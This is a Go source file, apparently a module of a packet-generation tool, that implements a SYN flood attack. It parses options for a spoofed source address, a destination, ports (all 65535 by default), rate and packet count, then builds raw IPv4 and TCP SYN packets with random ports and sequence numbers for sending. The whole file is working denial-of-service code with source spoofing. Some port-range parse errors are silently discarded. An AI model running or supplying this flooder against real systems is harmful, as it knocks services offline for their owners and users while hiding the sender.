package module

import (
	"os"
	"strings"
	"errors"
	"math/rand"

	"github.com/crazyboycjr/cyclone-jet-rocket/protocol"
	flags "github.com/jessevdk/go-flags"
)

type SynFloodOpt struct {
	BaseOption
	Spoof string `short:"s" long:"spoof" description:"use spoof address" value-name:"address[/mask]" default:""`
	DestFunc func(string) `short:"d" long:"destination" description:"destination address" value-name:"address"`
	PortFunc func(string) `short:"p" long:"dport" description:"destination port" value-name:"port[:port]"`
	ports []uint16
	CountFunc func(int) `short:"c" long:"count" description:"stop after sending count packets" value-name:"count" default:"0"`
	RateFunc func(string) `short:"r" long:"rate" description:"send packets as a specific rate, such as 100/ms, 2/s, 100/min, the default is \"nolimit\"" value-name:"<speed>" default:"nolimit"`
	TTL uint `short:"t" long:"ttl" description:"set TTL of IP packet" value-name:"ttl" default:"64"`
}

func (s SynFloodOpt) IsBroadcast() bool {
	return false
}

func synFloodEntry(stopChan chan int, remainFlags []string) error {
	var opts SynFloodOpt

	opts.ports = []uint16{}
	var err2 error
	opts.PortFunc = func(portStr string) {
		var st, en uint16
		sepCount := strings.Count(portStr, ":")
		if sepCount == 1 {
			ports := strings.Split(portStr, ":")
			var err error
			st, err = parsePort(ports[0])
			if err != nil { err2 = nil }
			en, err = parsePort(ports[1])
			if err != nil { err2 = nil }
			if st > en {
				err2 = errors.New("start port number must be smaller than end port number")
				return
			}
		} else if sepCount == 0 {
			var err error
			st, err = parsePort(portStr)
			if err != nil {
				err2 = err
				return
			}
			en = st
		} else {
			err2 = errors.New("wrong port format")
			return
		}
		for i := st; i <= en; i++ {
			opts.ports = append(opts.ports, i)
		}
		// sort unique
		m := make(map[uint16] int)
		for _, i := range opts.ports {
			m[i] = 1
		}
		opts.ports = opts.ports[:0]
		for i, _ := range m {
			opts.ports = append(opts.ports, i)
		}
	}

	opts.RateFunc = func(rate string) {
		e := commonRateFunc(&opts, rate)
		if e != nil { err2 = e }
	}
	opts.DestFunc = func(dest string) {
		e := commonDestFunc(&opts, dest)
		if e != nil { err2 = e }
	}
	opts.CountFunc = func(count int) {
		e := commonCountFunc(&opts, count)
		if e != nil { err2 = e }
	}

	//fmt.Println(remainFlags)
	cmd := flags.NewParser(&opts, flags.HelpFlag | flags.PrintErrors)

	_, err := cmd.ParseArgs(remainFlags)
	if err != nil {
		return err
	}

	if len(remainFlags) == 0 {
		cmd.WriteHelp(os.Stderr)
	}
	for _, flag := range remainFlags {
		if flag == "help" {
			cmd.WriteHelp(os.Stderr)
			return nil
		}
	}

	if err2 != nil { return err2 }

	if len(opts.ports) == 0 {
		opts.ports = make([]uint16, 65535, 65535)
		for i := 1; i < 65536; i++ {
			opts.ports[i - 1] = uint16(i)
		}
	}
	if opts.dest == nil {
		return errors.New("no destination IP specified")
	}

	return packetSend(stopChan, synFloodBuild, &opts)
}

func synFloodBuild(opts_ CommonOption) []protocol.Layer {
	opts := opts_.(*SynFloodOpt)
	srcip := chooseIPv4(opts.Spoof)

	pseudoHeader := make([]byte, 12, 12)
	copy(pseudoHeader[0:4], srcip.To4())
	copy(pseudoHeader[4:8], opts.dest.To4())
	tcp := &protocol.TCP {
		PseudoHeader: pseudoHeader,
		SrcPort: uint16(rand.Intn(0xffff)),
		DstPort: opts.ports[curPort],
		Seq: uint32(rand.Intn(0x100000000)),
		Ack: 0,
		Flags: protocol.TCPFlags {
			SYN: true,
		},
		Rwnd: 20 * 1460,
		UrgPtr: 0,
	}
	curPort++
	if curPort >= len(opts.ports) {
		curPort -= len(opts.ports)
	}

	ip4 := &protocol.IPv4Packet {
		Version: 4,
		IHL: 5,
		DSCP: 0,
		ECN: 0, // TODO just see what will happen
		ID: uint16(rand.Intn(0xffff)),
		DF: true,
		MF: false,
		FragmentOffset: 0,
		TTL: uint8(opts.TTL),
		Protocol: protocol.IPP_TCP,
		SrcIP: srcip,
		DstIP: opts.dest,
	}
	return []protocol.Layer{ip4, tcp}
}
